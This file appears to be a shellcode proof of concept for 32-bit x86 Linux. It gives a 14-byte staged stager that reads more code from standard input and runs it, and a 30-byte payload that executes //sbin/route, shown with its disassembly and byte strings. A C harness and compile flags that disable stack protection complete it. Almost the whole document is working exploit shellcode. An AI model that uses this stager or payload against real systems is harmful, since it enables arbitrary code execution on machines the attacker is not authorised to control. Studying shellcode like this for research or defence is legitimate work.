/*
'''
; Date: 10/03/2019
; Staged-Execve-Route.asm
; Author: Daniele Votta
; Description: This program execute //sbin/route from staged (read input from STDIN) shellcode (14 bytes).
; Tested on: i686 GNU/Linux
'''

execve-stack-route:     file format elf32-i386
Disassembly of section .text:

08048080 <_start>:
 8048080:	31 c0                	xor    eax,eax
 8048082:	50                   	push   eax
 8048083:	68 6f 75 74 65       	push   0x6574756f
 8048088:	68 69 6e 2f 72       	push   0x722f6e69
 804808d:	68 2f 2f 73 62       	push   0x62732f2f
 8048092:	89 e3                	mov    ebx,esp
 8048094:	50                   	push   eax
 8048095:	89 e2                	mov    edx,esp
 8048097:	53                   	push   ebx
 8048098:	89 e1                	mov    ecx,esp
 804809a:	b0 0b                	mov    al,0xb
 804809c:	cd 80                	int    0x80
[+] Extract Shellcode ... 
"\x31\xc0\x50\x68\x6f\x75\x74\x65\x68\x69\x6e\x2f\x72\x68\x2f\x2f\x73\x62\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
(30 bytes)

======================= POC Daniele Votta =======================
*/

#include<stdio.h>
#include<string.h>

/* 
Compile: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o shellcode
How to use: echo -ne "\x31\xc0\x50\x68\x6f\x75\x74\x65\x68\x69\x6e\x2f\x72\x68\x2f\x2f\x73\x62\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"|./shellcode
*/

/* Read Shellcode from STDIN (127 bytes | 0x7F) Execve //sbin/route (14 bytes) */
unsigned char code[] = \
"\x6A\x7F\x5A\x54\x59\x31\xDB\x6A\x03\x58\xCD\x80\x51\xC3";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
